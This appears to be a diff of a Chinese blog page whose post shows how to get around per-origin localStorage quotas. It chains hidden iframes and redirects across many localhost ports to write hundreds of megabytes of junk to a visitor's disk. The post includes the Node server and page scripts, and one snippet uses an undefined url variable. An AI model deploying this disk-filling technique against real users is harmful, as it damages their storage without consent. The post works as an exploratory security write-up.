@@ -193,9 +193,7 @@ var _hmt = _hmt || [];
       
         <p>有人说，前端的界限就在浏览器那儿。</p>
 <p>无论你触发了多少bug，最多导致浏览器崩溃，对系统影响不到哪去。<br>这就像二次元各种炫酷的毁灭世界，都不会导致三次元的世界末日。<br>然而，作为一个前端，我发现是有方式打开次元大门的…</p>
-<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些<strong>安全问题</strong>。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，<strong>点开一个链接，电脑突然就蓝屏了</strong>！想想还真有点小激动。</p>
-<a id="more"></a>
-
+<p>这个实验脑洞较大，动机无聊，但某种意义上反映了一些<strong>安全问题</strong>。<br>想象一下，有天你在家里上网，吃着火锅还唱着歌，<strong>点开一个链接，电脑突然就蓝屏了</strong>！想想还真有点小激动。<br><a id="more"></a></p>
 <h3 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h3><p>故事得从localStorage说起。</p>
 <p>html5的本地存储，相信大家都不陌生。将数据以二进制文件形式存储到本地，在当前应用得非常广泛。<br>windows下的chrome，localStorage存储于<code>C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Local Storage</code>文件夹中。但如果任由网页无限写文件，对用户硬盘的伤害可想而知，因而浏览器对其做了大小限制。</p>
 <p>对于一个域名+端口，PC侧的上限是5M-10M之间，移动侧是则不大于2.5M。</p>
@@ -203,15 +201,12 @@ var _hmt = _hmt || [];
 <h3 id="关键"><a href="#关键" class="headerlink" title="关键"></a>关键</h3><p>关键的问题在于，这一限制，针对的是一个<code>域名+端口</code>。<br>也就是说，你访问<code>同一个域名的不同端口</code>，它们的localStorage并无关联，是分开存储的。</p>
 <p>我用node简单地开启了服务器，这时，用户访问<code>http://127.0.0.1:1000</code>到<code>http://127.0.0.1:1099</code>这100个端口，会请求到同一个页面：<code>index.html</code>：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//100个端口</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> port = <span class="number">1000</span>; port&lt; <span class="number">1100</span>; port++)&#123;</span><br><span class="line">  http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//请忽略这种循环读文件的方式，只为了简便</span></span><br><span class="line">    fs.readFile(<span class="string">'./index.html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">err, content</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(err) &#123;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        response.writeHead(<span class="number">200</span>, &#123; <span class="string">'Content-Type'</span> : <span class="string">'text/html; charset=UTF-8'</span> &#125;);</span><br><span class="line">        response.write(content);</span><br><span class="line">        response.end();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;).listen(port, <span class="string">'127.0.0.1'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>当然，这个index.html里涉及了localStorage写操作。</p>
 <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var s = <span class="string">""</span>;</span><br><span class="line"><span class="comment">//慢慢来，别写太大了，好害怕…</span></span><br><span class="line">for(var i=<span class="number">0</span>; i&lt; <span class="number">3</span> * <span class="number">1024</span> * <span class="number">1024</span>; i++)&#123;</span><br><span class="line">  s += <span class="string">"0"</span>;</span><br><span class="line">&#125;</span><br><span class="line">localStorage.setItem(<span class="string">"testData"</span>, s);</span><br></pre></td></tr></table></figure>
-
 <p>我试着用浏览器分别访问了几个端口，结果是分开存储。一切跟剧本一样。</p>
 <h3 id="自动遍历"><a href="#自动遍历" class="headerlink" title="自动遍历"></a>自动遍历</h3><p>但这种程度还不够。<br>如果要实验变得更好（xie）玩（e）一些，问题就变成如何<code>让用户自动遍历这些端口</code>？</p>
 <p>iframe是个好的尝试。<br>只要一打开<code>http://127.0.0.1: 1000</code>，页面的脚步就会创建一个iframe，去请求<code>http://127.0.0.1: 1001</code>，一直循环下去。</p>
 <figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Main = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _key = <span class="string">"testData"</span>;</span><br><span class="line">  <span class="keyword">var</span> _max = <span class="number">1100</span>; <span class="comment">//最大限制</span></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attribute">init</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="comment">//慢慢来，别写太大了，好害怕…</span></span><br><span class="line">      <span class="keyword">var</span> s = <span class="string">""</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt; <span class="number">3</span> * <span class="number">1024</span> * <span class="number">1024</span>; i++)&#123;</span><br><span class="line">        s += <span class="string">"0"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      localStorage.setItem(_key, s);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> port = <span class="built_in">parseInt</span>(location.port)+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//新添加iframe</span></span><br><span class="line">      <span class="keyword">var</span> <span class="built_in">url</span> = <span class="string">"http://127.0.0.1:"</span> + port;</span><br><span class="line">      <span class="keyword">var</span> $iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">      $iframe.src = <span class="built_in">url</span>;</span><br><span class="line">      <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild($iframe);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
 <p>当然iframe我们还可以设置为不可见，以掩盖这种不厚道的行为…<br>比方说，有人发给你一个链接，你打开后发现是个视频，而你根本注意不到背后的脚本，在视频播放的几分钟里，快要把你的C盘写满。</p>
 <p>然后我就看到请求如潮水渐涨：<br><img src="/assets/blogImg/localstorage1.png" alt></p>
 <p>但是，请求到1081端口，最新的chrome就崩溃掉了…原来iframe嵌套太多，已经到达了浏览器的极限。</p>
@@ -219,7 +214,6 @@ var _hmt = _hmt || [];
 <p>C盘还未撑满，同志还需努力。怎么办？</p>
 <p>突然想到，到达iframe极限之前，我们可以重定向啊。<br>每访问50个端口，就使用<code>window.location.href</code>重定向一次，去确保浏览器不崩溃。</p>
 <figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Main = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> _key = <span class="string">"testData"</span>;</span><br><span class="line">  <span class="keyword">var</span> _max = <span class="number">1200</span>; <span class="comment">//最大限制</span></span><br><span class="line">  <span class="keyword">var</span> _jumpSpace = <span class="number">50</span>; <span class="comment">//为避免iframe过多导致浏览器crash，每50个执行跳转</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attribute">init</span>: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="comment">//慢慢来，别写太大了，好害怕…</span></span><br><span class="line">      <span class="keyword">var</span> s = <span class="string">""</span>;</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt; <span class="number">3</span> * <span class="number">1024</span> * <span class="number">1024</span>; i++)&#123;</span><br><span class="line">        s += <span class="string">"0"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      localStorage.setItem(_key, s);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">var</span> port = <span class="built_in">parseInt</span>(location.port)+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(port &gt; _max) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(port % _jumpSpace == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">//每50个，重定向一次</span></span><br><span class="line">        <span class="built_in">window</span>.location.href = <span class="built_in">url</span>;</span><br><span class="line">      &#125;<span class="title">else</span>&#123;</span><br><span class="line">        <span class="comment">//新添加iframe</span></span><br><span class="line">        <span class="keyword">var</span> $iframe = <span class="built_in">document</span>.createElement(<span class="string">"iframe"</span>);</span><br><span class="line">        $iframe.src = <span class="built_in">url</span>;</span><br><span class="line">        <span class="built_in">document</span>.getElementsByTagName(<span class="string">"body"</span>)[<span class="number">0</span>].appendChild($iframe);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>
-
 <p>事实证明，这种蛮拼的方法的确可行。</p>
 <p>至此，只要访问<code>http://127.0.0.1: 1000</code>，就会往Local Storage文件夹里写入近500M无用数据：<br><img src="/assets/blogImg/localstorage3.png" alt></p>
 <p>里面的数据是这样的：<br><img src="/assets/blogImg/localstorage2.png" alt></p>
@@ -347,7 +341,7 @@ var _hmt = _hmt || [];
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=http://theone.org.cn/2015/07/06/hack-in-localstorage/" alt="微信分享二维码">
+      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACO0lEQVR42u3a227CMBBF0f7/T1OpT1QUs89xWpXxzhNCUeJlpGEu/vjA1+3ruv98/83jnc/uf/x+/fniS4YMGW/LuC2v7pWP3683Yv3e9dpkyJBxDoME2fWj061Z359ukwwZMmSkgZg8fx18ZciQIWM/4JIFdYWxDBkyZOwUsTwRJNvRFbcX1OIyZMh4Q0YXHP/m86/PN2TIkPHvGbfqShNB3ozrViVDhozZjP3ikyeInEHacKhvJ0OGjBGMrmTliSM/fpEmiC/+N2TIkDGIkQY4khryZhw/flEWtDJkyBjBSIMgX1y60C5N/Pa/IUOGjNGMrmXWjQ26BPTFlsmQIeMABgpqVYHapYPpFsiQIeMEBgl8/OAXL0TjISXvGsqQIWMcI23Wk5Ycv+eCpp4MGTKOYfBgx1NJXuJ2A4wXGa4MGTLGMQiGhNd0zsjf+HQlMmTIOIZBHteNKru2WlA2y5AhYzSjGy52Q0e+NTx8//CbyJAhYygjXdz+2CDdpoAqQ4aMoYwuBSRhND1ysTUwkCFDxgGMbpyZpm47W1D+Y8iQIWMQgyd8fCTZtfO64agMGTJmM7rDWN1IkieCcaNNhgwZQxm38NoPx+l4AAV0GTJkjGakx0Z5S64j7aSeMmTImM3grXzejNsfecaDTBkyZBzA4MdMSU28g7ygCpchQ8bxjDgUgmV1YVeGDBky0qbY/iCBBGgZMmSczOiOO/BDFTxMx6FWhgwZBzD2BwM7SWH6xu6IhgwZMt6W8Qn9KfAurPv1BwAAAABJRU5ErkJggg==" alt="微信分享二维码">
     </div>
 </div>
 
@@ -425,6 +419,22 @@ if (width < 960) {
 window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("//changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
   
 
+  
+    <section id="comments">
+      <div id="disqus_thread"></div>
+        <script type="text/javascript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = '[object Object]'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+      <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </section>
   
 
 
@@ -566,11 +576,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">css</a>
+                <a href="javascript:void(0)" class="js-tag color5">css3</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">css3</a>
+                <a href="javascript:void(0)" class="js-tag color4">css</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -594,10 +604,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">web</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">安全</a>
               </li>
              
@@ -607,6 +613,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">octopress</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">web</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -642,11 +652,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">模式</a>
+                <a href="javascript:void(0)" class="js-tag color3">故事</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">故事</a>
+                <a href="javascript:void(0)" class="js-tag color3">模式</a>
               </li>
              
               <li class="article-tag-list-item">
